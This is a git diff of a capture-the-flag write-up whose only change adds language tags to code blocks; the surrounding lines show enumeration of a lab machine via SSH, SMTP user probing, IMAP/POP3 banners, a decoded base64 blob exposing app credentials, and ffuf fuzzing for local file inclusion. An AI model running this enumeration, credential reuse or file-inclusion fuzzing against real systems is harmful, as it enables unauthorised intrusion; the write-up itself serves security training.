@@ -41,7 +41,7 @@ This isn't an ancient version of SSH, so it's unlikely that we'll find an exploi
 
 Password authentication is supported, however the initial check for weak passwords failed. 
 
-```
+```bash
 ssh root@$ip
 The authenticity of host '10.10.172.107 (10.10.172.107)' can't be established.
 ED25519 key fingerprint is SHA256:uURSOQLABB+Das+Emk8jQtlj9stf8TDyVdiz6DZmjoU.
@@ -62,7 +62,7 @@ We can move on from SSH for now.
 
 Using `telnet` to connect to the SMTP service, we're able to enumerate valid users on the system, as shown below. Note the message after attempting to send mail to a user that does not exist ("doesnotexist") compared to the message received after entering a user that does exist ("root").
 
-```
+```bash
 telnet $ip 25
 Trying 10.10.172.107...
 Connected to 10.10.172.107.
@@ -88,7 +88,7 @@ Let's hold onto this for now and come back to it later.
 
 We can grab the IMAP banner with netcat.
 
-```
+```bash
 nc -nv $ip 143
 Connection to 10.10.102.86 143 port [tcp/*] succeeded!
 * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ STARTTLS LOGINDISABLED] Dovecot (Ubuntu) ready.
@@ -96,7 +96,7 @@ Connection to 10.10.102.86 143 port [tcp/*] succeeded!
 
 Trying to log in, we get an error that plaintext authentication is not authorized over the unencrypted channel (good!). 
 
-```
+```bash
 A1 LOGIN th0m12 th0m12
 * BAD [ALERT] Plaintext authentication not allowed without SSL/TLS, but your client did it anyway. If anyone was listening, the password was exposed.
 A1 NO [PRIVACYREQUIRED] Plaintext authentication disallowed on non-secure (SSL/TLS) connections.
@@ -104,7 +104,7 @@ A1 NO [PRIVACYREQUIRED] Plaintext authentication disallowed on non-secure (SSL/T
 
 Connecting with openssl allows entering credentials, but since we don't have creds there's not much we can access. If nothing pans out with the other services, we might circle back to this to try brute forcing the credentials using the two usernames we've already enumerated. 
 
-```
+```bash
 openssl s_client -connect $ip:993 -quiet
 Can't use SSL_get_servername
 depth=0 CN = ip-10-10-31-82.eu-west-1.compute.internal
@@ -123,7 +123,7 @@ A1 BAD Error in IMAP command received by server.
 
 Similarly, I didn't get anything from the POP3 service running on the server either.
 
-```
+```bash
 openssl s_client -connect $ip:995 -crlf -quiet
 Can't use SSL_get_servername
 depth=0 CN = ip-10-10-31-82.eu-west-1.compute.internal
@@ -149,7 +149,7 @@ RETR 1
 
 After adding the IP to the `/etc/hosts` file with the command below we're able to browse to the first web app:
 
-```
+```bash
 echo -n '10.10.188.130\tinclude.thm' | sudo tee -a /etc/hosts
 ```
 
@@ -192,7 +192,7 @@ When we enter that and hit "Update Banner Image", we get back the following resp
 
 Looks like a base64-encoded string.
 
-```
+```bash
 echo 'eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=' | base64 -d | jq
 {
   "ReviewAppUsername": "admin",
@@ -228,7 +228,7 @@ To make this work with `ffuf` I saved the request to a file and then replaced "p
 
 Having configured the request file, we can run `ffuf` against it. 
 
-```
+```bash
 ffuf -r -c -request req.txt -request-proto 'http' -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 0
 
         /'___\  /'___\           /'___\
@@ -351,7 +351,7 @@ Here is the "mystery" text file that will give us flag 2.
 
 Looking at the code for `profile.php`, we can see what's happening here.
 
-```
+```php
 <?php
 session_start();
 
